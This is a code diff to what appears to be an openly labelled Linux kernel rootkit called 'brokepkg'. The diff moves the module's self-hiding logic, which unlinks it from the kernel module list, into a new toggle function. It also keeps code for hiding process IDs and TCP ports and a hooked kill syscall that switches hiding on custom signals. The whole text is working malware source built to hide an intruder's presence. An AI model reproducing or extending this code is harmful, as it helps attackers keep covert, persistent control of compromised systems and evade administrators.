@@ -2,6 +2,7 @@
 // backdoor header
 #include "backdoor.h"
 #include "config.h"
+#include "module_hide.h"
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
@@ -30,27 +31,8 @@ static inline void tidy(void) {
   THIS_MODULE->sect_attrs = NULL;
 }
 
-static struct list_head *prev_module;
-static short isHidden = 0;
 char hide_pid[NAME_MAX];
 unsigned short hide_port[MAX_TCP_PORTS] = {0};
-
-void module_show(void) {
-  list_add(&THIS_MODULE->list, prev_module);
-  isHidden = 0;
-#ifdef DEBUG
-  printk(KERN_INFO "brokepkg: module revealed");
-#endif
-}
-
-void module_hide(void) {
-  prev_module = THIS_MODULE->list.prev;
-  list_del(&THIS_MODULE->list);
-  isHidden = 1;
-#ifdef DEBUG
-  printk(KERN_INFO "brokepkg: hidden module");
-#endif
-}
 
 void pid_hide(pid_t pid) {
   sprintf(hide_pid, "%d", pid);
@@ -139,10 +121,7 @@ asmlinkage int hook_kill(pid_t pid, int sig) {
 #endif
   switch (sig) {
     case SIGHIDE:
-      if (isHidden)
-        module_show();
-      else
-        module_hide();
+      switch_module_hide();
       break;
     case SIGMODINVIS:
       pid_hide(pid);
